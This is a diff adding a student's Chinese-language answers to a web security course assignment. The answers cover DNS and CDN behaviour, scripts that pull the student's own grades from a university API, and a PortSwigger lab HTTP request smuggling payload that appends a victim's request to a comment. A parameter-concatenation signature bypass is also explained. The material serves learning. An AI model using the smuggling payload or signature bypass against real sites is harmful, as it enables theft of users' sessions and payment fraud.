@@ -8,6 +8,8 @@ import Card from '@md-components/card.vue';
 
 import PasswordContainer from '@md-components/passwordContainer.vue';
 
+import {NImage} from 'naive-ui'
+
 <PasswordContainer md5="a8f531bd290138ddafa3be02a00e3172">
 
 # Task 1: 网络基础 (30%)
@@ -29,7 +31,7 @@ import Asciinema from '@md-components/AsciinemaWrapper.vue';
 
 <Card type="task" title="任务">
 
-- 分别直接访问用校内 DNS 和校外 DNS 查询到的 IP 地址，能否访问成功？访问结果有何区别？这些地址是服务器的真实地址吗？试分析造成这种现象的原因。
+- 分别直接访问用校内 DNS 和校外 DNS 查询到的 IP 地址，能否访问成功？访问结果有何区别？试分析造成这种现象的原因。
   - 提示：可以对比用域名和用 IP 访问的 HTTP 请求包区别，理解问题出在哪一层
 </Card>
 
@@ -37,7 +39,13 @@ import Asciinema from '@md-components/AsciinemaWrapper.vue';
 
 不过访问`10.203.4.70`的响应来自`server: nginx`
 
+访问`123.6.142.24`的响应来自`server: Tengine`
 
+这些地址是服务器的真实地址吗？答曰：不一定是。前者感觉就是信息中心的服务器地址，不过后者应该是CDN地址，套了一层负载均衡
+
+为啥Forbidden我捏？
+
+直观的说，正常访问是header中`host: www.zju.edu.cn`，直接发IP的话`host: 123.6.142.24`，对于原站，封锁裸IP请求可以防止源站地址泄露（来点FOFA震撼），对于CDN，本身同一个IP可能托管数十个网站，出于安全和隐私的考虑，这种无法明确识别目标域名的请求就应该403 Forbidden
 
 # Task 2: HTTP原理应用 (35%)
 
@@ -50,6 +58,25 @@ import Asciinema from '@md-components/AsciinemaWrapper.vue';
     - 可供参考：[Intercept HTTP traffic with Burp Proxy](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic)
 </Card>
 
+**加载流程**
+
+1. `https://zdbk.zju.edu.cn/jwglxt/cxdy/xscjcx_cxXscjIndex.html?gnmkdm=N5083&layout=default` 加载文档内容
+
+2. 加载resource，这是`<script type="text/javascript" src=""></script>`以及`<link rel="stylesheet" type="text/css" href=""/>`标记的js和CSS内容
+
+3. 加载数据
+    来自`https://zdbk.zju.edu.cn/jwglxt/js/comp/jwglxt/cxdy/grcjddy/xscjcxIndex.js`的JS代码执行，通过 ~~`fetch`~~ 原来是jQuery这种老古董啊 来发送API请求
+
+核心的API请求是这个：
+
+```http
+POST https://zdbk.zju.edu.cn/jwglxt/cxdy/xscjcx_cxXscjIndex.html?doType=query&gnmkdm=N5083 
+Cookie: [Redacted]
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+xn=&xq=&zscjl=&zscjr=&_search=false&nd=1752514175592&queryModel.showCount=15&queryModel.currentPage=1&queryModel.sortName=xkkh&queryModel.sortOrder=asc&time=0
+```
+
 ## 抓取成绩
 
 <Card type="task" title="任务">
@@ -58,6 +85,77 @@ import Asciinema from '@md-components/AsciinemaWrapper.vue';
     - 可以使用生成式 AI 帮助自己学习编码
     - **你需要提交相关代码**
 </Card> 
+
+<center>
+<div style="width:60%">
+[![](https://opengraph.githubassets.com/token/5dbwat4/login-ZJU)](https://github.com/5dbwat4/login-ZJU)
+</div>
+
+</center>
+
+
+*你知道的，我一直喜欢整一些没用的库.jpg*
+
+```js
+import { ZJUAM, ZDBK } from 'login-zju';
+import "dotenv/config"; 
+
+const am = new ZJUAM(process.env.ZJU_USERNAME, process.env.ZJU_PASSWORD);
+const ZDBK = new ZDBK(am);
+
+ZDBK.fetch("https://zdbk.zju.edu.cn/jwglxt/cxdy/xscjcx_cxXscjIndex.html?doType=query&gnmkdm=N5083",{
+   method: "POST",
+   body: new URLSearchParams({
+       xn: "",
+       xq: "",
+       zscjl: "",
+       zscjr: "",
+       _search: "false",
+       nd: Date.now(),
+       "queryModel.showCount": "1500",
+       "queryModel.currentPage": "1",
+       "queryModel.sortName": "xkkh",
+       "queryModel.sortOrder": "asc",
+       time: "0"
+   }),
+}).then(r=>r.json()).then(res => {
+    console.log(res.data);
+}).catch(err => {
+    console.error(err);
+});
+```
+
+哦不对，原来要用`requests`库
+
+```python
+import requests
+
+Cookie = "JSESSION...[Redacted]"
+
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+}
+data = {
+    "xn": "",
+    "xq": "",
+    "zscjl": "",
+    "zscjr": "",
+    "_search": "false",
+    "nd": "1752514175592",
+    "queryModel.showCount": "1500",
+    "queryModel.currentPage": "1",
+    "queryModel.sortName": "xkkh",
+    "queryModel.sortOrder": "asc",
+    "time": "0"
+}
+response = requests.post(
+    "https://zdbk.zju.edu.cn/jwglxt/cxdy/xscjcx_cxXscjIndex.html?doType=query&gnmkdm=N5083",
+    headers=headers,
+    cookies=Cookie,
+      data=data
+)
+print(response.json())
+```
 
 
 
@@ -164,8 +262,40 @@ HTTP请求走私（HTTP Request Smuggling）是一种利用**HTTP协议解析差
 
 
 ```http
+POST /post/comment HTTP/1.1
+Host: 0a1b004e036258358003036a00940036.web-security-academy.net
+Cookie: session=[Redacted]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 319
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a1b004e036258358003036a00940036.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 800
+Cookie: session=[Redacted]
+
+csrf=[Redacted]&postId=3&name=attacker&email=attacker@example.com&comment=
 
 ```
+
+import imageBSolve from './images/web1-blog.png?url'
+
+<NImage src={imageBSolve} />
+
+说明：
+
+1. **前端解析**：`Content-Length: 356`  
+   - 前端服务器根据此值读取整个请求（包括走私的第二个请求）。
+
+2. **后端解析**：`Transfer-Encoding: chunked`  
+   - 后端服务器优先处理分块编码，遇到 `0\r\n\r\n` 认为第一个请求结束。
+
+3. **走私请求**：  
+   - 第二个 `POST /post/comment` 是未完成的请求，其 `Content-Length: 800` 要求后端等待更多数据。
+   - `comment=` 参数未闭合，下一个请求（受害者的请求）的数据会被追加至此。
 
 # Bonus: 漏洞报告阅读 (+15%)
 
@@ -174,6 +304,17 @@ HTTP请求走私（HTTP Request Smuggling）是一种利用**HTTP协议解析差
     - 用自己的语言简述漏洞的成因
     - 简述绕过服务器校验的原理
 </Card>
+
+**漏洞的成因**: 参数拼接式签名验证**无法对参数边界进行严格界定**。
+
+**绕过服务器校验的原理**:
+
+1. **维持签名不变**  
+   无论是将原参数 `Amount=2000` 改为 `Amount2=000`，还是将邮箱 `CustomerEmail=brixamount100abc@xxx` 改为 `CustomerEmail=brix&amount=100&ab=c@xxx`，都是确保拼接字符串与原值一致，使 Hash 签名验证通过。
+
+2. **通过邮箱字段（不可信任的用户可控内容）注入恶意参数**  
+   通过特殊格式的 Steam 账户邮箱，将原参数 `Amount=2000` 改为 `Amount2=000`，使原参数无效，将邮箱 `CustomerEmail=brixamount100abc@xxx` 改为 `brix&amount=100&ab=c@xxx`，注入新参数 `amount=100`。
+
 
 
 </PasswordContainer>
